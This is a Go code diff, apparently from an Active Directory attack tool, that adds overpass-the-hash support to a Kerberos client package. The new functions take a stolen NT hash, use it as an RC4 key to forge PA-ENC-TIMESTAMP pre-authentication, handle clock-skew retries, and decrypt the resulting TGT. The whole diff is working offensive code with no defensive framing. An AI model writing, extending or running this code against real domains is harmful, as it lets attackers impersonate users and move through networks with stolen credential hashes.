@@ -3,6 +3,7 @@ package krb
 import (
 	"encoding/hex"
 	"fmt"
+	"strings"
 
 	"github.com/jcmturner/gokrb5/v8/credentials"
 	"github.com/jcmturner/gokrb5/v8/crypto"
@@ -62,6 +63,115 @@ func asExchange(kdc, domain, username, password string) (messages.ASRep, error) 
 		return none, err
 	}
 	return rep, nil
+}
+
+func asExchangeHash(kdc, domain, username, hash string) (messages.ASRep, error) {
+	var none messages.ASRep
+	nt, err := parseNTHash(hash)
+	if err != nil {
+		return none, err
+	}
+	cfg, err := NewConfig(domain, kdc)
+	if err != nil {
+		return none, err
+	}
+	cfg.LibDefaults.Forwardable = true
+	cfg.LibDefaults.NoAddresses = true
+	user := samOnly(username)
+	realm := Realm(domain)
+	bootstrapOffset(kdc)
+	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
+	req, err := messages.NewASReqForTGT(realm, cfg, cname)
+	if err != nil {
+		return none, err
+	}
+	req.ReqBody.EType = []int32{etypeID.RC4_HMAC, etypeID.AES256_CTS_HMAC_SHA1_96, etypeID.AES128_CTS_HMAC_SHA1_96}
+	key := types.EncryptionKey{KeyType: etypeID.RC4_HMAC, KeyValue: nt}
+	rep, err := sendASReq(kdc, req)
+	if err != nil {
+		ke, ok := asKRBError(err, nil)
+		if !ok {
+			return none, err
+		}
+		if ke.ErrorCode == errorcode.KRB_AP_ERR_SKEW {
+			ApplySKEW(ke)
+			return none, wrapKRB(ke)
+		}
+		if ke.ErrorCode != errorcode.KDC_ERR_PREAUTH_REQUIRED && ke.ErrorCode != errorcode.KDC_ERR_PREAUTH_FAILED {
+			return none, wrapKRB(ke)
+		}
+		if err := addPAEncTimestampKey(&req, key, ke); err != nil {
+			return none, err
+		}
+		rep, err = sendASReq(kdc, req)
+		if err != nil {
+			ke2, ok := asKRBError(err, nil)
+			if ok && ke2.ErrorCode == errorcode.KRB_AP_ERR_SKEW {
+				ApplySKEW(ke2)
+				if err := addPAEncTimestampKey(&req, key, ke2); err != nil {
+					return none, err
+				}
+				rep, err = sendASReq(kdc, req)
+			}
+			if err != nil {
+				return none, wrapKRB(err)
+			}
+		}
+	}
+	if rep.EncPart.EType != etypeID.RC4_HMAC {
+		return none, fmt.Errorf("overpass AS-REP etype=%d (want RC4/23); AES TGT needs --pass-file, S4U still AES-only", rep.EncPart.EType)
+	}
+	pt, err := crypto.DecryptEncPart(rep.EncPart, key, keyusage.AS_REP_ENCPART)
+	if err != nil {
+		return none, fmt.Errorf("decrypt AS-REP (overpass RC4): %w", err)
+	}
+	if err := rep.DecryptedEncPart.Unmarshal(pt); err != nil {
+		return none, fmt.Errorf("AS-REP enc-part: %w", err)
+	}
+	if rep.DecryptedEncPart.Nonce != req.ReqBody.Nonce {
+		return none, fmt.Errorf("AS nonce mismatch")
+	}
+	return rep, nil
+}
+
+func parseNTHash(h string) ([]byte, error) {
+	h = strings.TrimSpace(h)
+	if i := strings.LastIndex(h, ":"); i >= 0 {
+		h = h[i+1:]
+	}
+	h = strings.TrimSpace(h)
+	if len(h) != 32 {
+		return nil, fmt.Errorf("NT hash must be 32 hex chars (or LM:NT)")
+	}
+	b, err := hex.DecodeString(h)
+	if err != nil || len(b) != 16 {
+		return nil, fmt.Errorf("NT hash hex: %w", err)
+	}
+	return b, nil
+}
+
+func addPAEncTimestampKey(req *messages.ASReq, key types.EncryptionKey, ke messages.KRBError) error {
+	_ = ke
+	ts, err := marshalPAEncTS(Now())
+	if err != nil {
+		return err
+	}
+	enc, err := crypto.GetEncryptedData(ts, key, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
+	if err != nil {
+		return fmt.Errorf("PA-ENC-TIMESTAMP: %w", err)
+	}
+	pb, err := enc.Marshal()
+	if err != nil {
+		return err
+	}
+	filtered := req.PAData[:0]
+	for _, pa := range req.PAData {
+		if pa.PADataType != patype.PA_ENC_TIMESTAMP {
+			filtered = append(filtered, pa)
+		}
+	}
+	req.PAData = append(filtered, types.PAData{PADataType: patype.PA_ENC_TIMESTAMP, PADataValue: pb})
+	return nil
 }
 
 func asWithPA(kdc string, req *messages.ASReq, password string, preauth messages.KRBError) (messages.ASRep, error) {
